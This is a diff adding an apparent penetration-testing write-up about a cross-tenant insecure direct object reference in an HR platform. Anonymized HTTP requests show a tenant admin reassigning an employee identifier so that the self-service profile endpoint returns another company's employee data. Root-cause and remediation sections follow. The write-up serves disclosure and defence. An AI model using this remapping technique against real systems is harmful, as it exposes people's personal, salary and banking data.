@@ -1,0 +1,268 @@
+---
+title: "Cross-Tenant Information Disclosure via Mutable Identifier Mapping"
+category: articles
+description: "A case study analyzing a broken access control vulnerability in an HR platform that allowed cross-tenant data exposure through mutable employee identifiers."
+date: 2026-08-08
+tags:
+  - Broken Access Control
+  - API Security
+  - Case Study
+  - CWE-639
+authors:
+  - tr3m0x
+image: ./assets/cover.png
+---
+
+During a recent penetration testing engagement, a high-severity vulnerability was identified in an HR management application. The vulnerability allowed cross-tenant information disclosure due to an insecure authorization mechanism that mapped user profiles to a mutable employee identifier.
+
+This article details the mechanics of the vulnerability, an exploitation walkthrough with anonymized HTTP requests/responses, the root cause, and remediation strategies.
+
+---
+
+## Vulnerability Details
+
+- **Severity:** High
+- **Category:** Broken Access Control / Insecure Direct Object Reference (IDOR)
+- **CWE Mapping:**
+  - **CWE-639:** Authorization Bypass Through User-Controlled Key
+  - **CWE-284:** Improper Access Control
+
+---
+
+## Vulnerability Description
+
+The target application features a multi-tenant architecture designed to host employee profiles and payroll details for multiple distinct organizations. Administrators within a tenant can manage employee records and modify various attributes, including the employee business identifier (referred to as the `employee_id` or matricule).
+
+The core vulnerability lies in the `/api/self-service/profile` API endpoint. Instead of using a secure, immutable relation (such as an internal database primary key or session token claim) to resolve the authenticated user's profile, the application resolves profiles dynamically using the mutable business identifier.
+
+As a result, if an administrator changes an employee's identifier to the identifier of a record belonging to another employee (either in the same company or a different company/tenant), the associated self-service endpoint begins disclosing the profile of the target employee. This allows arbitrary association of employee accounts with target profiles, breaking both user-level and tenant-level isolation boundaries.
+
+---
+
+## Impact
+
+An attacker with tenant administrator privileges can systematically disclose sensitive employee information across all tenant organizations. The exposed data includes:
+
+- Full Name and Personal Details
+- Email Address & Phone Number
+- Tunisian National Identification Number (CIN)
+- Department, Position, and Salary
+- Employment History & Contract details
+- Internal Company IDs
+
+Because employee identifiers follow a predictable, sequential convention (e.g., `EMP-0001`, `EMP-0002`), the discovery and enumeration of valid identifiers can be trivially automated, enabling bulk data exfiltration.
+
+---
+
+## Attack Scenario & Exploitation Walkthrough
+
+To demonstrate the vulnerability, we walk through an attack scenario where an administrator of **Company A** access details of **Company B**'s employees.
+
+### Step 1: Modifying the Employee Identifier
+
+The administrator of **Company A** modifies a controlled employee account (`EMP-9998`) and sets its identifier (`new_employee_id`) to `EMP-0001` (an identifier belonging to an employee at **Company B**).
+
+**Request:**
+
+```http
+PUT /api/employees/EMP-9998 HTTP/1.1
+Host: hr-portal.target.com
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/json
+Authorization: Bearer <ADMIN_JWT_TOKEN>
+Origin: https://hr-portal.target.com
+Referer: https://hr-portal.target.com/employees/EMP-9998/edit
+Connection: keep-alive
+
+{
+  "first_name": "Jane",
+  "last_name": "Doe",
+  "cin": "12345678",
+  "cnss_number": "",
+  "father_name": "",
+  "email": "user@example.com",
+  "phone": "",
+  "date_of_birth": "",
+  "date_of_joining": "2026-07-21",
+  "department": "",
+  "designation": "",
+  "base_salary": 0,
+  "regime_cnss": "Régime Général",
+  "regime_horaire": "48h",
+  "situation_familiale": "Célibataire",
+  "is_chef_de_famille": false,
+  "nombre_enfants": 0,
+  "address": "",
+  "bank_name": "",
+  "rib": "",
+  "work_regime": "Journalier",
+  "hours_per_day": 8,
+  "days_per_week": 6,
+  "branch_id": null,
+  "grade_id": null,
+  "employment_type_id": null,
+  "reports_to": null,
+  "contract_type": "",
+  "contract_end_date": "",
+  "shift_location_id": null,
+  "status": "Actif",
+  "independant_class_level": 1,
+  "independant_accident_insurance": false,
+  "independant_accident_rate": 0.01,
+  "new_employee_id": "EMP-0001"
+}
+```
+
+**Response:**
+
+```http
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Tue, 21 Jul 2026 21:43:51 GMT
+Content-Type: application/json
+Connection: keep-alive
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Origin: https://hr-portal.target.com
+Vary: Origin
+
+{
+  "first_name": "Jane",
+  "last_name": "Doe",
+  "email": "user@example.com",
+  "cin": "12345678",
+  "cnss_number": "",
+  "father_name": "",
+  "date_of_birth": "",
+  "date_of_joining": "2026-07-21",
+  "department": "",
+  "designation": "",
+  "base_salary": 0.0,
+  "situation_familiale": "Célibataire",
+  "is_chef_de_famille": false,
+  "nombre_enfants": 0,
+  "regime_cnss": "Régime Général",
+  "regime_horaire": "48h",
+  "phone": "",
+  "address": "",
+  "company_id": "<COMPANY_ID_1>",
+  "bank_name": "",
+  "rib": "",
+  "work_regime": "Journalier",
+  "hours_per_day": 8.0,
+  "days_per_week": 6.0,
+  "independant_class_level": 1,
+  "independant_accident_insurance": false,
+  "independant_accident_rate": 0.01,
+  "branch_id": null,
+  "grade_id": null,
+  "employment_type_id": null,
+  "reports_to": null,
+  "shift_location_id": null,
+  "classe_cnss": null,
+  "has_work_accident_insurance": false,
+  "work_accident_rate_independant": 0.01,
+  "employee_id": "EMP-0001",
+  "status": "Actif",
+  "id": "<EMPLOYEE_ID_1>"
+}
+```
+
+The server returns a `200 OK` status and successfully maps the controlled employee record to the new identifier `EMP-0001`.
+
+### Step 2: Authenticating as the Controlled User
+
+Next, the attacker logs in using the credentials of the controlled employee account (`user@example.com`) whose mapping was modified. The JWT payload for this session resolves to:
+
+```json
+{
+  "sub": "user@example.com",
+  "exp": 1784672090
+}
+```
+
+### Step 3: Accessing the Self-Service Portal
+
+The authenticated user makes a request to the self-service endpoint `/api/self-service/profile`.
+
+**Request:**
+
+```http
+GET /api/self-service/profile HTTP/1.1
+Host: hr-portal.target.com
+Sec-Ch-Ua-Platform: "Linux"
+Authorization: Bearer <USER_JWT_TOKEN>
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Accept: application/json, text/plain, */*
+Connection: keep-alive
+```
+
+**Response:**
+
+```http
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Tue, 21 Jul 2026 21:44:56 GMT
+Content-Type: application/json
+Connection: keep-alive
+
+{
+  "first_name": "John",
+  "last_name": "Doe",
+  "email": "john.doe@example.com",
+  "cin": "87654321",
+  "cnss_number": "12345678-0",
+  "date_of_birth": "1980-01-01",
+  "date_of_joining": "2011-01-01",
+  "department": "DIRECTION",
+  "designation": "Gérant",
+  "base_salary": 3000.000,
+  "is_chef_de_famille": true,
+  "nombre_enfants": 2,
+  "regime_cnss": "Régime Indépendant",
+  "regime_horaire": "48h",
+  "phone": "+21600000000",
+  "address": "123 Sample Street, City",
+  "company_id": "<COMPANY_ID_2>",
+  "bank_name": "EXAMPLE_BANK",
+  "rib": "12345678901234567890",
+  "work_regime": "Journalier",
+  "hours_per_day": 8.0,
+  "days_per_week": 6.0,
+  "branch_id": null,
+  "grade_id": null,
+  "employment_type_id": null,
+  "reports_to": null,
+  "slack_user_id": "",
+  "employee_id": "EMP-0001",
+  "status": "Actif",
+  "situation_familiale": "Marié(e)",
+  "shift_location_id": "<LOCATION_ID>",
+  "father_name": "",
+  "id": "<EMPLOYEE_ID_2>"
+}
+```
+
+As shown, instead of retrieving Jane Doe's profile (the user who logged in), the API returns the profile of **John Doe** (`john.doe@example.com`), which belongs to a completely different company tenant (`company_id: <COMPANY_ID_2>`).
+
+---
+
+## Root Cause Analysis
+
+The root cause of this vulnerability lies in the design of the mapping relation:
+
+1. **Mapping to a Mutable Identifier:** The application maps the session principal (`sub: user@example.com`) to the corresponding profile database record using the user-configurable field `employee_id`. Since this field is mutable, changing it breaks the association integrity.
+2. **Lack of Immutable Keys:** Ownership authorization checks should rely on non-editable keys (e.g. database UUIDs) that are generated internally and cannot be manipulated by users or administrators.
+3. **Lack of Tenant Isolation Checking:** The API lacks context-aware validation. When resolving `/api/self-service/profile`, it fails to confirm whether the resolved profile belongs to the tenant domain (Company ID) associated with the authenticated user.
+
+---
+
+## Remediation & Mitigation
+
+To secure the application against this vulnerability, the following changes are recommended:
+
+- **Bind Accounts with Immutable Keys:** Associate user authentication accounts with employee records using internal, read-only identifiers (e.g., auto-incremented integers or UUIDs) rather than business identifiers.
+- **Remove User-Controlled Mapping Modifiability:** Business identifiers (matricules) should only serve display purposes and should not be used as query parameter lookup keys or routing variables in authorization contexts.
+- **Enforce Strict Tenant Ownership Checks:** Every backend service layer should validate that any queried object belongs to the user's tenant scope (e.g., `WHERE employee.company_id = session.company_id`).
